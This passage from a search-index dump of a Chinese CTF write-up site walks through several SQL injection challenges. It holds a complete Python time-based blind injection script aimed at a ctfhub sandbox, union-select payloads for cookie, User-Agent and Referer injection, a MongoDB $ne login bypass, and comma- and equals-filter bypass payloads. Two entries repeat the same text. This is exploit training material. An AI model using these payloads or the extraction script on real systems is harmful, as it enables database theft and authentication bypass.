<p></p>"},{"location":"Web/Chapter8/8-30/","title":"\u65f6\u95f4\u76f2\u6ce8","text":""},{"location":"Web/Chapter8/8-30/#\u65f6\u95f4\u76f2\u6ce8","title":"\u65f6\u95f4\u76f2\u6ce8","text":"<p>\u76f4\u63a5\u4e0a\u811a\u672c\u8dd1</p> <pre><code>import requests\nfrom urllib.parse import quote\n\nbase_url = \"http://challenge-59668c27594f7541.sandbox.ctfhub.com:10800/?id=\"\nheaders = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"close\", \"Referer\": \"http://challenge-59668c27594f7541.sandbox.ctfhub.com:10800/\", \"Upgrade-Insecure-Requests\": \"1\"}\n\ndef get_database_length():\n    global base_url, headers\n    length = 1\n    while (1):\n        id = \"1 and if(length(database()) = \" + str(length) + \", 1, sleep(2))\"\n        url = base_url + quote(id) #\u5f88\u91cd\u8981\uff0c\u56e0\u4e3aid\u4e2d\u6709\u8bb8\u591a\u7279\u6b8a\u5b57\u7b26\uff0c\u6bd4\u5982#\uff0c\u9700\u8981\u8fdb\u884curl\u7f16\u7801\n        try:\n            requests.get(url, headers=headers, timeout=1).text\n        except Exception:\n            print(\"database length\", length, \"failed!\")\n            length+=1\n        else:\n            print(\"database length\", length, \"success\")\n            print(\"payload:\", id)\n            break\n    print(\"\u6570\u636e\u5e93\u540d\u7684\u957f\u5ea6\u4e3a\", length)\n    return length\n\ndef get_database(database_length):\n    global base_url, headers\n    database = \"\"\n    for i in range(1, database_length + 1):\n        l, r = 0, 127 #\u795e\u5947\u7684\u7533\u660e\u65b9\u6cd5\n        while (1):\n            ascii = (l + r) // 2\n            id_equal = \"1 and if(ascii(substr(database(), \" + str(i) + \", 1)) = \" + str(ascii) + \", 1, sleep(2))\"\n            try:\n                requests.get(base_url + quote(id_equal), headers=headers, timeout=1).text\n            except Exception:\n                id_bigger = \"1 and if(ascii(substr(database(), \" + str(i) + \", 1)) &gt; \" + str(ascii) + \", 1, sleep(2))\"\n                try:\n                    requests.get(base_url + quote(id_bigger), headers=headers, timeout=1).text\n                except Exception:\n                    r = ascii - 1\n                else:\n                    l = ascii + 1\n            else:\n                database += chr(ascii)\n                print (\"\u76ee\u524d\u5df2\u77e5\u6570\u636e\u5e93\u540d\", database)\n                break\n\n    print(\"\u6570\u636e\u5e93\u540d\u4e3a\", database)\n    return database\n\ndef get_table_num(database):\n    global base_url, headers\n    num = 1\n    while (1):\n        id = \"1 and if((select count(table_name) from information_schema.tables where table_schema = '\" + database + \"') = \" + str(num) + \", 1, sleep(2))\"\n        try:\n            requests.get(base_url + quote(id), headers=headers, timeout=1).text\n        except Exception:\n            num += 1\n        else:\n            print(\"payload:\", id)\n            print(\"\u6570\u636e\u5e93\u4e2d\u6709\", num, \"\u4e2a\u8868\")\n            break\n    return num\n\ndef get_table_length(index, database):\n    global base_url, headers\n    length = 1\n    while (1):\n        id = \"1 and if((select length(table_name) from information_schema.tables where table_schema = '\" + database + \"' limit \" + str(index) + \", 1) = \" + str(length) + \", 1, sleep(2))\"\n        try:\n            requests.get(base_url + quote(id), headers=headers, timeout= 1).text\n        except Exception:\n            print(\"table length\", length, \"failed!\")\n            length+=1\n        else:\n            print(\"table length\", length, \"success\")\n            print(\"payload:\", id)\n            break\n    print(\"\u6570\u636e\u8868\u540d\u7684\u957f\u5ea6\u4e3a\", length)\n    return length\n\ndef get_table(index, table_length, database):\n    global base_url, headers\n    table = \"\"\n    for i in range(1, table_length + 1):\n        l, r = 0, 127 #\u795e\u5947\u7684\u7533\u660e\u65b9\u6cd5\n        while (1):\n            ascii = (l + r) // 2\n            id_equal = \"1 and if((select ascii(substr(table_name, \" + str(i) + \", 1)) from information_schema.tables where table_schema = '\" + database + \"' limit \" + str(index) + \",1) = \" + str(ascii) + \", 1, sleep(2))\"\n            try:\n                response = requests.get(base_url + quote(id_equal), headers=headers, timeout=1).text\n            except Exception:\n                id_bigger = \"1 and if((select ascii(substr(table_name, \" + str(i) + \", 1)) from information_schema.tables where table_schema = '\" + database + \"' limit \" + str(index) + \",1) &gt; \" + str(ascii) + \", 1, sleep(2))\"\n                try:\n                    response = requests.get(base_url + quote(id_bigger), headers=headers, timeout=1).text\n                except Exception:\n                    r = ascii - 1\n                else:\n                    l = ascii + 1\n            else:\n                table += chr(ascii)\n                print (\"\u76ee\u524d\u5df2\u77e5\u6570\u636e\u5e93\u540d\", table)\n                break\n    print(\"\u6570\u636e\u8868\u540d\u4e3a\", table)\n    return table\n\ndef get_column_num(table):\n    global base_url, headers\n    num = 1\n    while (1):\n        id = \"1 and if((select count(column_name) from information_schema.columns where table_name = '\" + table + \"') = \" + str(num) + \", 1, sleep(2))\"\n        try:\n            requests.get(base_url + quote(id), headers=headers, timeout=1).text\n        except Exception:\n            num += 1\n        else:\n            print(\"payload:\", id)\n            print(\"\u6570\u636e\u8868\", table, \"\u4e2d\u6709\", num, \"\u4e2a\u5b57\u6bb5\")\n            break\n    return num\n\ndef get_column_length(index, table):\n    global base_url, headers\n    length = 1\n    while (1):\n        id = \"1 and if((select length(column_name) from information_schema.columns where table_name = '\" + table + \"' limit \" + str(index) + \", 1) = \" + str(length) + \", 1, sleep(2))\"\n        try:\n            requests.get(base_url + quote(id), headers=headers, timeout=1).text\n        except Exception:\n            print(\"column length\", length, \"failed!\")\n            length+=1\n        else:\n            print(\"column length\", length, \"success\")\n            print(\"payload:\", id)\n            break\n    print(\"\u6570\u636e\u8868\", table, \"\u7b2c\", index, \"\u4e2a\u5b57\u6bb5\u7684\u957f\u5ea6\u4e3a\", length)\n    return length\n\ndef get_column(index, column_length, table):\n    global base_url, headers\n    column = \"\"\n    for i in range(1, column_length + 1):\n        l, r = 0, 127 #\u795e\u5947\u7684\u7533\u660e\u65b9\u6cd5\n        while (1):\n            ascii = (l + r) // 2\n            id_equal = \"1 and if((select ascii(substr(column_name, \" + str(i) + \", 1)) from information_schema.columns where table_name = '\" + table + \"' limit \" + str(index) + \",1) = \" + str(ascii) + \", 1, sleep(2))\"\n            try:\n                requests.get(base_url + quote(id_equal), headers=headers, timeout=1).text\n            except Exception:\n                id_bigger = \"1 and if((select ascii(substr(column_name, \" + str(i) + \", 1)) from information_schema.columns where table_name = '\" + table + \"' limit \" + str(index) + \",1) &gt; \" + str(ascii) + \", 1, sleep(2))\"\n                try:\n                    requests.get(base_url + quote(id_bigger), headers=headers, timeout=1).text\n                except Exception:\n                    r = ascii - 1\n                else:\n                    l = ascii + 1\n            else:\n                column += chr(ascii)\n                print (\"\u76ee\u524d\u5df2\u77e5\u5b57\u6bb5\u4e3a\", column)\n                break\n\n    print(\"\u6570\u636e\u8868\", table, \"\u7b2c\", index, \"\u4e2a\u5b57\u6bb5\u540d\u4e3a\", column)\n    return column\n\ndef get_flag_num(column, table):\n    global base_url, headers\n    num = 1\n    while (1):\n        id = \"1 and if((select count(\" + column + \") from \" + table + \") = \" + str(num) + \", 1, sleep(2))\"\n        try:\n            requests.get(base_url + quote(id), headers=headers, timeout=1).text\n        except Exception:\n            num += 1\n        else:\n            print(\"payload:\", id)\n            print(\"\u6570\u636e\u8868\", table, \"\u4e2d\u6709\", num, \"\u884c\u6570\u636e\")\n            break\n    return num\n\ndef get_flag_length(index, column, table):\n    global base_url, headers\n    length = 1\n    while (1):\n        id = \"1 and if((select length(\" + column + \") from \" + table + \" limit \" + str(index) + \", 1) = \" + str(length) + \", 1, sleep(2))\"\n        try:\n            requests.get(base_url + quote(id), headers=headers, timeout=1).text\n        except Exception:\n            print(\"flag length\", length, \"failed!\")\n            length+=1\n        else:\n            print(\"flag length\", length, \"success\")\n            print(\"payload:\", id)\n            break\n    print(\"\u6570\u636e\u8868\", table, \"\u7b2c\", index, \"\u884c\u6570\u636e\u7684\u957f\u5ea6\u4e3a\", length)\n    return length\n\ndef get_flag(index, flag_length, column, table):\n    global base_url, headers\n    flag = \"\"\n    for i in range(1, flag_length + 1):\n        l, r = 0, 127 #\u795e\u5947\u7684\u7533\u660e\u65b9\u6cd5\n        while (1):\n            ascii = (l + r) // 2\n            id_equal = \"1 and if((select ascii(substr(\" + column + \", \" + str(i) + \", 1)) from \" + table + \" limit \" + str(index) + \",1) = \" + str(ascii) + \", 1, sleep(2))\"\n            try:\n                requests.get(base_url + quote(id_equal), headers=headers, timeout=1).text\n            except Exception:\n                id_bigger = \"1 and if((select ascii(substr(\" + column + \", \" + str(i) + \", 1)) from \" + table + \" limit \" + str(index) + \",1) &gt; \" + str(ascii) + \", 1, sleep(2))\"\n                try:\n                    requests.get(base_url + quote(id_bigger), headers=headers, timeout=1).text\n                except Exception:\n                    r = ascii - 1\n                else:\n                    l = ascii + 1\n            else:\n                flag += chr(ascii)\n                print (\"\u76ee\u524d\u5df2\u77e5flag\u4e3a\", flag)\n                break\n    print(\"\u6570\u636e\u8868\", table, \"\u7b2c\", index, \"\u884c\u6570\u636e\u4e3a\", flag)\n    return flag\n\nif __name__ == \"__main__\":\n    print(\"---------------------\")\n    print(\"\u5f00\u59cb\u83b7\u53d6\u6570\u636e\u5e93\u540d\u957f\u5ea6\")\n    database_length = get_database_length()\n    print(\"---------------------\")\n    print(\"\u5f00\u59cb\u83b7\u53d6\u6570\u636e\u5e93\u540d\")\n    database = get_database(database_length)\n    print(\"---------------------\")\n    print(\"\u5f00\u59cb\u83b7\u53d6\u6570\u636e\u8868\u7684\u4e2a\u6570\")\n    table_num = get_table_num(database)\n    tables = []\n    print(\"---------------------\")\n    for i in range(0, table_num):\n        print(\"\u5f00\u59cb\u83b7\u53d6\u7b2c\", i + 1, \"\u4e2a\u6570\u636e\u8868\u7684\u540d\u79f0\u7684\u957f\u5ea6\")\n        table_length = get_table_length(i, database)\n        print(\"---------------------\")\n        print(\"\u5f00\u59cb\u83b7\u53d6\u7b2c\", i + 1, \"\u4e2a\u6570\u636e\u8868\u7684\u540d\u79f0\")\n        table = get_table(i, table_length, database)\n        tables.append(table)\n    while(1): #\u5728\u8fd9\u4e2a\u5faa\u73af\u4e2d\u53ef\u4ee5\u8fdb\u5165\u6240\u6709\u7684\u6570\u636e\u8868\u4e00\u63a2\u7a76\u7adf\n        print(\"---------------------\")\n        print(\"\u73b0\u5728\u5f97\u5230\u4e86\u4ee5\u4e0b\u6570\u636e\u8868\", tables)\n        table = input(\"\u8bf7\u5728\u8fd9\u4e9b\u6570\u636e\u8868\u4e2d\u9009\u62e9\u4e00\u4e2a\u76ee\u6807: \")\n        while( table not in tables ):\n            print(\"\u4f60\u8f93\u5165\u6709\u8bef\")\n            table = input(\"\u8bf7\u91cd\u65b0\u9009\u62e9\u4e00\u4e2a\u76ee\u6807\")\n        print(\"---------------------\")\n        print(\"\u9009\u62e9\u6210\u529f\uff0c\u5f00\u59cb\u83b7\u53d6\u6570\u636e\u8868\", table, \"\u7684\u5b57\u6bb5\u6570\u91cf\")\n        column_num = get_column_num(table)\n        columns = []\n        print(\"---------------------\")\n        for i in range(0, column_num):\n            print(\"\u5f00\u59cb\u83b7\u53d6\u6570\u636e\u8868\", table, \"\u7b2c\", i + 1, \"\u4e2a\u5b57\u6bb5\u540d\u79f0\u7684\u957f\u5ea6\")\n            column_length = get_column_length(i, table)\n            print(\"---------------------\")\n            print(\"\u5f00\u59cb\u83b7\u53d6\u6570\u636e\u8868\", table, \"\u7b2c\", i + 1, \"\u4e2a\u5b57\u6bb5\u7684\u540d\u79f0\")\n            column = get_column(i, column_length, table)\n            columns.append(column)\n        while(1): #\u5728\u8fd9\u4e2a\u5faa\u73af\u4e2d\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u9009\u62e9\u6570\u636e\u8868\u7684\u6240\u6709\u5b57\u6bb5\u8bb0\u5f55\n            print(\"---------------------\")\n            print(\"\u73b0\u5728\u5f97\u5230\u4e86\u6570\u636e\u8868\", table, \"\u4e2d\u7684\u4ee5\u4e0b\u5b57\u6bb5\", columns)\n            column = input(\"\u8bf7\u5728\u8fd9\u4e9b\u5b57\u6bb5\u4e2d\u9009\u62e9\u4e00\u4e2a\u76ee\u6807: \")\n            while( column not in columns ):\n                print(\"\u4f60\u8f93\u5165\u6709\u8bef\")\n                column = input(\"\u8bf7\u91cd\u65b0\u9009\u62e9\u4e00\u4e2a\u76ee\u6807\")\n            print(\"---------------------\")\n            print(\"\u9009\u62e9\u6210\u529f\uff0c\u5f00\u59cb\u83b7\u53d6\u6570\u636e\u8868\", table, \"\u7684\u8bb0\u5f55\u6570\u91cf\")\n            flag_num = get_flag_num(column, table)\n            flags = []\n            print(\"---------------------\")\n            for i in range(0, flag_num):\n                print(\"\u5f00\u59cb\u83b7\u53d6\u6570\u636e\u8868\", table, \"\u7684\", column, \"\u5b57\u6bb5\u7684\u7b2c\", i + 1, \"\u884c\u8bb0\u5f55\u7684\u957f\u5ea6\")\n                flag_length = get_flag_length(i, column, table)\n                print(\"---------------------\")\n                print(\"\u5f00\u59cb\u83b7\u53d6\u6570\u636e\u8868\", table, \"\u7684\", column, \"\u5b57\u6bb5\u7684\u7b2c\", i + 1, \"\u884c\u8bb0\u5f55\u7684\u5185\u5bb9\")\n                flag = get_flag(i, flag_length, column, table)\n                flags.append(flag)\n            print(\"---------------------\")\n            print(\"\u73b0\u5728\u5f97\u5230\u4e86\u6570\u636e\u8868\", table, \"\u4e2d\", column, \"\u5b57\u6bb5\u4e2d\u7684\u4ee5\u4e0b\u8bb0\u5f55\", flags)\n            quit = input(\"\u7ee7\u7eed\u5207\u6362\u5b57\u6bb5\u5417\uff1f(y/n)\")\n            if (quit == 'n' or quit == 'N'):\n                break\n            else:\n                continue\n        quit = input(\"\u7ee7\u7eed\u5207\u6362\u6570\u636e\u8868\u540d\u5417\uff1f(y/n)\")\n        if (quit == 'n' or quit == 'N'):\n            break\n        else:\n            continue\n    print(\"bye~\")\n</code></pre>"},{"location":"Web/Chapter8/8-31/","title":"Cookie \u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-31/#cookie-\u6ce8\u5165","title":"Cookie \u6ce8\u5165","text":"<p>\u63d0\u793a\u770b Cookie</p> <p></p> <p>\u6293\u5305\u770b\u5230\u6ce8\u5165\u70b9</p> <p></p> <p>\u5c06 ID \u6539\u4e3a 2\uff0c\u54cd\u5e94\u4e5f\u53d8\u4e3a\u4e86 2</p> <p></p> <p>\u6539\u4e3a 3 \u8fc7\u540e\u5462\u770b\u4e0d\u5230\u7528\u6237\u540d\u4e86\uff0c\u8bf4\u660e\u4ee5 id \u67e5\u8be2\u7ed3\u679c\u53ea\u6709\u4e24\u4e2a</p> <p></p> <p>\u7206\u5217\u6570\uff0c3 \u6ca1\u6709\u7ed3\u679c 2 \u6709\u7ed3\u679c\uff0c\u8bf4\u660e\u6709\u4e24\u5217</p> <pre><code>id=1 order by 3#;\n</code></pre> <p></p> <p>\u62ff\u5230\u6570\u636e\u5e93\u540d</p> <pre><code>id=3 union select 1,database()#;\n</code></pre> <p></p> <p>\u7206\u8868</p> <pre><code>id=3 union select 1,group_concat(table_name) from information_schema.tables where table_schema = 'sqli'#;\n</code></pre> <p></p> <p>\u7206\u5b57\u6bb5</p> <pre><code>id=3 union select 1,group_concat(column_name) from information_schema.columns where table_name = 'yegfyjbxsr'#;\n</code></pre> <p></p> <p>\u7206\u503c</p> <pre><code>id=3 union select 1,group_concat(oicwrwxmfo) from yegfyjbxsr#;\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-32/","title":"User-Agent \u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-32/#user-agent-\u6ce8\u5165","title":"User-Agent \u6ce8\u5165","text":"<p>\u63d0\u793a UA \u6ce8\u5165</p> <p></p> <p>\u6293\u5305\u6539\u4e3a 1 \u6709\u56de\u663e</p> <p></p> <p>\u6d4b\u5217\u6570\uff0c3 \u6ca1\u56de\u663e\u6240\u4ee5\u53ea\u6709\u4e24\u5217</p> <pre><code>1 order by 2#\n</code></pre> <p></p> <p>\u7206\u6570\u636e\u5e93</p> <pre><code>-1 union select 1,database()#\n</code></pre> <p></p> <p>\u7206\u8868</p> <pre><code>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = 'sqli'#\n</code></pre> <p></p> <p>\u7206\u5b57\u6bb5</p> <pre><code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_name = 'gopuwbgusp'#\n</code></pre> <p></p> <p>\u7206\u503c</p> <pre><code>-1 union select 1,group_concat(skjtcuyodd) from gopuwbgusp#\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-33/","title":"Refer \u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-33/#refer-\u6ce8\u5165","title":"Refer \u6ce8\u5165","text":"<p>\u63d0\u793a referer \u6ce8\u5165</p> <p></p> <p>\u8f93\u5165 1 \u6709\u56de\u663e</p> <p></p> <p>\u6d4b\u5217\u6570\uff0c3 \u6ca1\u56de\u663e\u6240\u4ee5\u53ea\u6709\u4e24\u5217</p> <pre><code>1 order by 2#\n</code></pre> <p></p> <p>\u7206\u6570\u636e\u5e93</p> <pre><code>-1 union select 1,database()#\n</code></pre> <p></p> <p>\u7206\u8868</p> <pre><code>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = 'sqli'#\n</code></pre> <p></p> <p>\u7206\u5b57\u6bb5</p> <pre><code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_name = 'gopuwbgusp'#\n</code></pre> <p></p> <p>\u7206\u6570\u636e</p> <pre><code>-1 union select 1,group_concat(ctsioqmiwf) from uqwshrzswx#\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-34/","title":"MongoDB NoSQL \u6ce8\u5165","text":""},{"location":"Web/Chapter8/8-34/#mongodb-nosql-\u6ce8\u5165","title":"MongoDB NoSQL \u6ce8\u5165","text":"<p>\u6f0f\u6d1e\u6e90\u4ee3\u7801</p> <pre><code>const users = await User.find({\n  email: email.startsWith(\"{\") &amp;&amp; email.endsWith(\"}\") ? JSON.parse(email) : email,\n  password: password.startsWith(\"{\") &amp;&amp; password.endsWith(\"}\") ? JSON.parse(password) : password\n});\n</code></pre> <p>1. <code>User.find({...})</code></p> <ul> <li>\u8fd9\u662f Mongoose (MongoDB ORM) \u7684\u67e5\u8be2\u65b9\u6cd5</li> <li>\u5b83\u4f1a\u5728\u6570\u636e\u5e93\u7684 <code>users</code> \u96c6\u5408\u91cc\u67e5\u627e\u7b26\u5408\u6761\u4ef6\u7684\u6587\u6863</li> <li>\u6761\u4ef6\u5c31\u662f\u4f20\u8fdb\u53bb\u7684\u5bf9\u8c61 <code>{ email: ..., password: ... }</code></li> </ul> <p>2. <code>email.startsWith(\"{\") &amp;&amp; email.endsWith(\"}\")</code></p> <ul> <li>\u68c0\u67e5 **email \u53c2\u6570**\u662f\u5426\u662f\u4e00\u4e2a\u4ee5 <code>{</code> \u5f00\u5934\u3001\u4ee5 <code>}</code> \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32</li> <li>\u4f8b\u5982\uff1a</li> <li><code>\"test@example.com\"</code> \u2192 <code>false</code></li> <li><code>\"{\\\"$ne\\\":null}\"</code> \u2192 <code>true</code></li> </ul> <p>3. \u4e09\u5143\u8fd0\u7b97\u7b26 <code>? JSON.parse(email) : email</code></p> <ul> <li>\u5982\u679c <code>email</code> \u662f\u4e00\u4e2a\u770b\u8d77\u6765\u50cf JSON \u5bf9\u8c61**\u7684\u5b57\u7b26\u4e32\uff0c\u5c31\u6267\u884c <code>JSON.parse(email)</code> \u2192 \u5f97\u5230\u4e00\u4e2a **JS \u5bf9\u8c61</li> <li>\u5426\u5219\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u666e\u901a\u5b57\u7b26\u4e32</li> </ul> <p>\u8fd9\u6837\u5199\u7684\u7ed3\u679c\u662f</p> <pre><code>User.find({\n  email: { $ne: null },\n  password: { $ne: null }\n});\n</code></pre> <p>\u56e0\u4e3a MongoDB \u7684 <code>$ne</code>\u3001<code>$regex</code> \u7b49\u64cd\u4f5c\u7b26\u4f1a\u88ab\u89e3\u91ca\u4e3a \u67e5\u8be2\u6761\u4ef6\uff0c\u4e0d\u662f\u666e\u901a\u5b57\u7b26\u4e32</p> <p>\u6240\u4ee5\u653b\u51fb\u8005\u53ef\u4ee5\u7ed5\u8fc7\u8ba4\u8bc1\u903b\u8f91\uff1a</p> <ul> <li><code>email={\"$ne\":null}</code>, <code>password={\"$ne\":null}</code> \u2192 \u5339\u914d\u4efb\u610f\u7528\u6237\uff0c\u76f4\u63a5\u767b\u5f55\u6210\u529f</li> </ul> <p>\u5728 Burp \u9700\u8981 <code>\\</code> \u8f6c\u4e49</p> <pre><code>{\n  \"email\": \"{\\\"$ne\\\": null}\",\n  \"password\": \"{\\\"$ne\\\": null}\"\n}\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-4/","title":"<> \u7ed5\u8fc7 = \u8fc7\u6ee4","text":""},{"location":"Web/Chapter8/8-4/#\u7ed5\u8fc7--\u8fc7\u6ee4","title":"&lt;&gt; \u7ed5\u8fc7 = \u8fc7\u6ee4","text":"<p>\u5c1d\u8bd5\u5f31\u53e3\u4ee4\u56de\u663e\u5bc6\u7801\u9519\u8bef</p> <p></p> <p>\u7528\u6237\u540d\u662f admin\uff0c\u4e07\u80fd\u5bc6\u7801\u56de\u663e\u975e\u6cd5\u5b57\u7b26</p> <p></p> <p>fuzz \u6d4b\u8bd5\u4e00\u6ce2\u770b\u770b\u8fc7\u6ee4\u4e86\u54ea\u4e9b</p> <p></p> <p>\u8fc7\u6ee4\u4e86\u7a7a\u683c\uff0c\u53ef\u4ee5\u4f7f\u7528 () \u7ed5\u8fc7</p> <p>\u540c\u65f6\u8fc7\u6ee4\u4e86 =\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u7528 &lt;&gt; \u66ff\u6362 !=</p> <p>\u4ed6\u4fe9\u90fd\u8868\u793a\u4e0d\u7b49\u4e8e\uff0c\u4e8e\u662f\u53ef\u4ee5\u6784\u9020\u8bed\u53e5\uff0c\u5148\u6c38\u5047\u6761\u4ef6\u6d4b\u8bd5\u8fd4\u56de\u7528\u6237\u540d\u4e0d\u5b58\u5728</p> <pre><code>hjakshdksjah'or(1&lt;&gt;1)#\n</code></pre> <p></p> <p>\u518d\u6c38\u771f\u6761\u4ef6\u6d4b\u8bd5\u8fd4\u56de\u5bc6\u7801\u4e0d\u5b58\u5728</p> <pre><code>hjakshdksjah'or(1&lt;&gt;2)#\n</code></pre> <p></p> <p>\u9996\u5148\u662f\u54b1\u8f93\u5165\u7684\u7528\u6237\u540d\u80af\u5b9a\u662f\u4e0d\u5b58\u5728\u7684\uff08\u952e\u76d8\u778e\u6309\u7684\uff09</p> <p>\u5982\u679c or \u8bed\u53e5\u4e3a\u5047\u5219\u7528\u6237\u540d\u4e0d\u5b58\u5728\uff0c\u53cd\u4e4b\u4e3a\u771f\uff0c\u7531\u6b64\u53ef\u4ee5\u5148\u6d4b\u8bd5\u6570\u636e\u5e93\u957f\u5ea6</p> <p>\u6700\u540e\u5f97\u5230\u6570\u636e\u5e93\u957f\u5ea6\u4e3a 8</p> <pre><code>hjakshdksjah'or(length(database()&gt;0))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u9700\u8981\u7206\u7834\u6570\u636e\u5e93\u540d\uff0c\u4f46\u662f\u5b83\u8fc7\u6ee4\u4e86\u9017\u53f7</p> <p>\u60f3\u5230\u4e86\u5b57\u7b26\u4e32\u622a\u53d6\u51fd\u6570 <code>substr()</code> \u4e0d\u8981\u9017\u53f7\u7a7a\u683c\u7684\u7528\u6cd5</p> <pre><code># from \u540e\u9762\u7684\u6570\u5b57\u8868\u793a\u5b83\u4ece\u7b2c\u51e0\u4f4d\u5f00\u59cb\u53d6\u5b57\u7b26\nsubstr('flag' from 1)       # \u8fd4\u56de\uff1aflag\nsubstr('flag' from 2)       # \u8fd4\u56de\uff1alag\n</code></pre> <p>\u53ef\u4ee5\u6784\u9020\u4e0b\u9762 payload \u62ff\u5230\u6570\u636e\u5e93\u540d</p> <pre><code>substr((database())from(1))\n</code></pre> <p>\u4f46\u662f for \u6709\u622a\u53d6\u957f\u5ea6\u9650\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u518d\u5957\u4e00\u4e2a <code>substr() + reverse()</code> \u6bcf\u6b21\u53ea\u622a\u53d6\u4e00\u4f4d</p> <pre><code>substr((reverse(substr('flag' form 1))) from 4 )        # \u8fd4\u56de\uff1af\nsubstr((reverse(substr('flag' form 2))) from 3 )        # \u8fd4\u56de\uff1al\nsubstr((reverse(substr('flag' form 3))) from 2 )        # \u8fd4\u56de\uff1aa\nsubstr((reverse(substr('flag' form 4))) from 1 )        # \u8fd4\u56de\uff1ag\n</code></pre> <p>\u6700\u540e\u518d\u5229\u7528\u4e4b\u524d &lt;&gt; \u914d\u5408 <code>ord()</code> \u8f6c ASCII \u7801\u6bd4\u8f83</p> <pre><code>asdadadadadas'or(ord(substr(reverse(substr((database())from(1)))from(8)))&lt;&gt;115)#\n</code></pre> <p></p>"},{"location":"Web/Chapter8/8-5/","title":"substr()+reverse()+ord() \u7ed5\u8fc7\u9017\u53f7\u8fc7\u6ee4","text":""},{"location":"Web/Chapter8/8-5/#substrreverseord-\u7ed5\u8fc7\u9017\u53f7\u8fc7\u6ee4","title":"substr()+reverse()+ord() \u7ed5\u8fc7\u9017\u53f7\u8fc7\u6ee4","text":"<p>\u5c1d\u8bd5\u5f31\u53e3\u4ee4\u56de\u663e\u5bc6\u7801\u9519\u8bef</p> <p></p> <p>\u7528\u6237\u540d\u662f admin\uff0c\u4e07\u80fd\u5bc6\u7801\u56de\u663e\u975e\u6cd5\u5b57\u7b26</p> <p></p> <p>fuzz \u6d4b\u8bd5\u4e00\u6ce2\u770b\u770b\u8fc7\u6ee4\u4e86\u54ea\u4e9b</p> <p></p> <p>\u8fc7\u6ee4\u4e86\u7a7a\u683c\uff0c\u53ef\u4ee5\u4f7f\u7528 () \u7ed5\u8fc7</p> <p>\u540c\u65f6\u8fc7\u6ee4\u4e86 =\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u7528 &lt;&gt; \u66ff\u6362 !=</p> <p>\u4ed6\u4fe9\u90fd\u8868\u793a\u4e0d\u7b49\u4e8e\uff0c\u4e8e\u662f\u53ef\u4ee5\u6784\u9020\u8bed\u53e5\uff0c\u5148\u6c38\u5047\u6761\u4ef6\u6d4b\u8bd5\u8fd4\u56de\u7528\u6237\u540d\u4e0d\u5b58\u5728</p> <pre><code>hjakshdksjah'or(1&lt;&gt;1)#\n</code></pre> <p></p> <p>\u518d\u6c38\u771f\u6761\u4ef6\u6d4b\u8bd5\u8fd4\u56de\u5bc6\u7801\u4e0d\u5b58\u5728</p> <pre><code>hjakshdksjah'or(1&lt;&gt;2)#\n</code></pre> <p></p> <p>\u9996\u5148\u662f\u54b1\u8f93\u5165\u7684\u7528\u6237\u540d\u80af\u5b9a\u662f\u4e0d\u5b58\u5728\u7684\uff08\u952e\u76d8\u778e\u6309\u7684\uff09</p> <p>\u5982\u679c or \u8bed\u53e5\u4e3a\u5047\u5219\u7528\u6237\u540d\u4e0d\u5b58\u5728\uff0c\u53cd\u4e4b\u4e3a\u771f\uff0c\u7531\u6b64\u53ef\u4ee5\u5148\u6d4b\u8bd5\u6570\u636e\u5e93\u957f\u5ea6</p> <p>\u6700\u540e\u5f97\u5230\u6570\u636e\u5e93\u957f\u5ea6\u4e3a 8</p> <pre><code>hjakshdksjah'or(length(database()&gt;0))#\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u9700\u8981\u7206\u7834\u6570\u636e\u5e93\u540d\uff0c\u4f46\u662f\u5b83\u8fc7\u6ee4\u4e86\u9017\u53f7</p> <p>\u60f3\u5230\u4e86\u5b57\u7b26\u4e32\u622a\u53d6\u51fd\u6570 <code>substr()</code> \u4e0d\u8981\u9017\u53f7\u7a7a\u683c\u7684\u7528\u6cd5</p> <pre><code># from \u540e\u9762\u7684\u6570\u5b57\u8868\u793a\u5b83\u4ece\u7b2c\u51e0\u4f4d\u5f00\u59cb\u53d6\u5b57\u7b26\nsubstr('flag' from 1)       # \u8fd4\u56de\uff1aflag\nsubstr('flag' from 2)       # \u8fd4\u56de\uff1alag\n</code></pre> <p>\u53ef\u4ee5\u6784\u9020\u4e0b\u9762 payload \u62ff\u5230\u6570\u636e\u5e93\u540d</p> <pre><code>substr((database())from(1))\n</code></pre> <p>\u4f46\u662f for \u6709\u622a\u53d6\u957f\u5ea6\u9650\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u518d\u5957\u4e00\u4e2a <code>substr() + reverse()</code> \u6bcf\u6b21\u53ea\u622a\u53d6\u4e00\u4f4d</p> <pre><code>substr((reverse(substr('flag' form 1))) from 4 )        # \u8fd4\u56de\uff1af\nsubstr((reverse(substr('flag' form 2))) from 3 )        # \u8fd4\u56de\uff1al\nsubstr((reverse(substr('flag' form 3))) from 2 )        # \u8fd4\u56de\uff1aa\nsubstr((reverse(substr('flag' form 4))) from 1 )        # \u8fd4\u56de\uff1ag\n</code></pre> <p>\u6700\u540e\u518d\u5229\u7528\u4e4b\u524d &lt;&gt; \u914d\u5408 <code>ord()</code> \u8f6c ASCII \u7801\u6bd4\u8f83</p> <pre><code>asdadadadadas'or(ord(substr(reverse(substr((database())from(1)))from(8)))&lt;&gt;115)#\n</code></pre> 